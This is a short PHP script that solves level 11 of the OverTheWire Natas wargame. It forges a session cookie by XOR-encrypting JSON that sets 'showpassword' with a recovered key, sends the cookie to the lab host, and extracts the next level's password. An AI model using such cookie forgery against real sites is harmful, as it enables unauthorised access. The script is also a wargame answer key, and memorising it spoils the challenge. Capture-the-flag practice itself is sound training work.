<?php
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Cookie\setCookie;

require_once dirname(__DIR__) . '/bootstrap.php';

$level = 11;
$username = 'natas' . $level;
$password = readFlag($level - 1);

$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$key = 'qw8J'; //use find_key.php
$data = json_encode(["showpassword" => "yes", "bgcolor" => "#ffffff"]);
$cookie = base64_encode(xor_encrypt($data, $key));

$jar = new CookieJar();
$jar->setCookie(new SetCookie([
    'Name' => 'data',
    'Value' => $cookie,
    'Domain' => 'natas11.natas.labs.overthewire.org',
]));

$response = $client->request('POST', $url, [
    'auth' => [$username, $password],
    'cookies' => $jar,
]);

$body = (string)$response->getBody();
preg_match("/The password for natas12 is (.*)<br>/", $body, $flag);
echo $flag[1];
